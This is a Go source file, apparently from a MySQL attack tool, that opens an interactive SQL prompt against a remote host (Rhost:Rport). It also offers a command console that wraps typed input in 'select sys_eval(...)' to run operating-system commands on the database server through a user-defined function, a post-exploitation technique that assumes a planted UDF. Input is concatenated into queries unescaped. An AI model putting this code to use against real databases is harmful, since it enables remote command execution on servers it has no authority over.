package pac

import (
	"bufio"
	"database/sql"
	"fmt"
	"log"
	"os"
	"strings"
)

func MysqlCMD(sqlstr string, conn *sql.DB) ([]map[string]interface{}, error) {
	rows, err := conn.Query(sqlstr)

	if err != nil {
		log.Println(err)
		return nil, err
	}
	defer rows.Close()

	// 数据列
	columns, err := rows.Columns()
	if err != nil {
		log.Println(err)
		return nil, err
	}

	count := len(columns)

	mData := make([]map[string]interface{}, 0)
	values := make([]interface{}, count)
	valPointers := make([]interface{}, count)
	for rows.Next() {
		for i := 0; i < count; i++ {
			valPointers[i] = &values[i]
		}

		rows.Scan(valPointers...)

		entry := make(map[string]interface{})

		for i, col := range columns {
			var v interface{}

			val := values[i]
			b, ok := val.([]byte)
			if ok {
				v = string(b)
			} else {
				v = val
			}
			entry[col] = v
		}

		mData = append(mData, entry)
	}
	return mData, nil
}

// 循环执行sql语句
func loopMysqlCMD(conn *sql.DB) {
	Info("执行mysql命令")
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Printf("%s:%s> ", Rhost, Rport)
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimRight(cmd, "\r\n")
		if cmd == "exit" || cmd == "q" || cmd == "quit" {
			break
		}
		result, err := MysqlCMD(cmd, conn)

		if err != nil {
			Info("循环执行sql语句报错")
		}
		for i, _ := range result {
			for _, w := range result[i] {
				fmt.Println(w)
			}
		}
	}
}

func MysqlCMDConsole(conn *sql.DB) {
	Info("执行系统命令")
	reader := bufio.NewReader(os.Stdin)
	for {
		udfcmd := "select sys_eval(\""
		var cmd string
		fmt.Printf("%s:%s> $ ", Rhost, Rport)
		cmd, _ = reader.ReadString('\n')
		cmd = strings.TrimRight(cmd, "\r\n")
		if cmd == "exit" || cmd == "q" || cmd == "quit" {
			break
		}
		aa := fmt.Sprintf("%s%s\");", udfcmd, cmd)
		Info(aa)
		result, err := MysqlCMD(aa, conn)
		if err != nil {
			Info("循环执行命令报错")
		}
		for i, _ := range result {
			for _, w := range result[i] {
				fmt.Println(w)
			}
		}
	}
}
